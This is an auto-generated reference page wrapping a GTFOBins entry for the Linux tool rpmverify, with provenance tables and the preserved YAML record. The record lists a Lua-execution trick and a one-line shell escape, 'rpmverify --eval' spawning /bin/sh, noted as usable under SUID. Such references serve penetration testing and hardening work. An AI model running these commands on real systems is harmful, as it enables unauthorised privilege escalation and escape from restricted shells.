---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# rpmverify

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `rpmverify` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/rpmverify` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [rpmverify](../../tools/linux/rpmverify.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rpmverify |
| name | rpmverify |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/rpmverify/ |

## Preserved Source Material

```yaml
_body: ''
_name: rpmverify
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/rpmverify
functions:
  inherit:
  - code: rpmverify --eval '%{lua:...}'
    comment: This allows to run Lua code (`...`).
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    from: lua
    version: Some older version is required.
  shell:
  - code: rpmverify --eval '%(/bin/sh 1>&2)'
    contexts:
      sudo: null
      suid:
        shell: true
      unprivileged: null
```
